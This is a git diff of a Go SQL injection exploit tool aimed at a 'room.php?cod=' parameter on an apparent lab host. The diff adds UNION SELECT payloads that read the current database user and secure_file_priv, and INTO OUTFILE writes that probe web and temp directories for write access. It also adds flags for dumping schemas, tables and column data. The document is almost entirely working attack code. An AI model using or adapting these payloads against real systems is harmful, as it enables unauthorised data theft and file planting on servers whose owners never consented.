@@ -16,7 +16,8 @@ type Result struct {
 }
 
 type Exploit struct {
-	Url string
+	Url     string
+	UriPath string
 }
 
 func (e *Exploit) PrintResult(res Result) {
@@ -25,6 +26,32 @@ func (e *Exploit) PrintResult(res Result) {
 		return
 	}
 	fmt.Printf("[+] Exploit result: %s \n", res.result)
+}
+
+func (e *Exploit) enumerateFilePrivilege() Result {
+	res := Result{
+		success: false,
+		result:  "",
+	}
+
+	sqliURL := fmt.Sprintf("%s%s", e.Url, e.UriPath)
+	resp, err := http.Get(sqliURL)
+	if err != nil {
+		fmt.Printf("[-] HTTP request failed for: %s\n", err)
+		return res
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		fmt.Printf("[-] Failed to read the response body: %s\n", err)
+		return res
+	}
+
+	res.success = true
+	res.result = string(body)
+
+	return res
 }
 
 func (e *Exploit) enumerateDatabase(payload string) Result {
@@ -36,7 +63,7 @@ func (e *Exploit) enumerateDatabase(payload string) Result {
 		result:  "",
 	}
 
-	sqliURL := fmt.Sprintf("%s%s", e.Url, payload)
+	sqliURL := fmt.Sprintf("%s%s%s", e.Url, e.UriPath, payload)
 	resp, err := http.Get(sqliURL)
 	if err != nil {
 		fmt.Printf("[-] HTTP request failed for: %s\n", err)
@@ -132,6 +159,30 @@ func customExploit(exploit *Exploit, tableName string, columnName string) Result
 	return exploit.enumerateDatabase(payload)
 }
 
+func checkCurrentUser(exploit *Exploit) Result {
+	fmt.Println("[+] Checking Current User --------------------------------------------------------------------------------------")
+
+	payload := "7 UNION ALL SELECT 1,CURRENT_USER(),3,4,5,6,7; -- -"
+	return exploit.enumerateDatabase(payload)
+}
+
+func checkFilePriveleges(exploit *Exploit) Result {
+	fmt.Println("[+] Checking FILE Privileges --------------------------------------------------------------------------------------")
+
+	payload := "7 UNION ALL SELECT 1,secure_file_priv,3,4,5,6,7; -- -"
+	return exploit.enumerateDatabase(payload)
+}
+
+func checkWriteableDirectory(exploit *Exploit, dir string) Result {
+	fmt.Println("[+] Checking Writeable Directory --------------------------------------------------------------------------------------")
+
+	payload := fmt.Sprintf("7 UNION ALL SELECT 1,'%s',3,4,5,6,7 INTO OUTFILE '%scheck.txt'; -- -", dir, dir)
+	exploit.enumerateDatabase(payload)
+
+	exploit.UriPath = "/check.txt"
+	return exploit.enumerateFilePrivilege()
+}
+
 func formatColumnNames(input string) string {
 	parts := strings.Split(input, ",")
 
@@ -148,25 +199,32 @@ func formatColumnNames(input string) string {
 }
 
 func main() {
-	url := "http://10.10.10.143/room.php?cod="
+	url := "http://10.10.10.143"
+	uriPath := "/room.php?cod="
 	exploit := Exploit{
-		Url: url,
+		Url:     url,
+		UriPath: uriPath,
 	}
 
-	defaultFuncs := []func(*Exploit) Result{
-		versionExploit,
-		schemaExploit,
-	}
+	version := flag.Int("v", 0, "Gets the version of teh database")
+	dbName := flag.Int("d", 0, "Enumerates schemas from the databases")
+	schemaName := flag.String("s", "", "Enumerates dbs from the schema name")
+	tableName := flag.String("t", "", "Enumerates tables from the db name")
+	columnName := flag.String("c", "", "Enumerates columns from the table name and aggregates all data of columns with a separator")
+	checkUser := flag.Int("check-user", 0, "Checks current user")
+	checkFile := flag.Int("check-file", 0, "Checks file privileges")
+	checkWrite := flag.Int("check-write", 0, "Checks writable directories")
+	flag.Parse()
 
-	for _, defaultFunc := range defaultFuncs {
-		res := defaultFunc(&exploit)
+	if *version == 1 {
+		res := versionExploit(&exploit)
 		exploit.PrintResult(res)
 	}
 
-	schemaName := flag.String("s", "", "Enumerates tables from the schema name")
-	tableName := flag.String("t", "", "Enumerates columns from the table name")
-	columnName := flag.String("c", "", "Enumerates columns from the table name")
-	flag.Parse()
+	if *dbName == 1 {
+		res := schemaExploit(&exploit)
+		exploit.PrintResult(res)
+	}
 
 	if *schemaName != "" {
 		res := tableExploit(&exploit, *schemaName)
@@ -185,5 +243,28 @@ func main() {
 		*columnName = formatColumnNames(res.result)
 		res = dataExploit(&exploit, *tableName, *columnName)
 		exploit.PrintResult(res)
+	}
+
+	if *checkUser == 1 {
+		res := checkCurrentUser(&exploit)
+		exploit.PrintResult(res)
+	}
+
+	if *checkFile == 1 {
+		res := checkFilePriveleges(&exploit)
+		exploit.PrintResult(res)
+	}
+
+	if *checkWrite == 1 {
+		directories := []string{
+			"/var/www/html/",
+			"/tmp/",
+			"/var/lib/mysql-files/",
+		}
+
+		for _, dir := range directories {
+			res := checkWriteableDirectory(&exploit, dir)
+			exploit.PrintResult(res)
+		}
 	}
 }
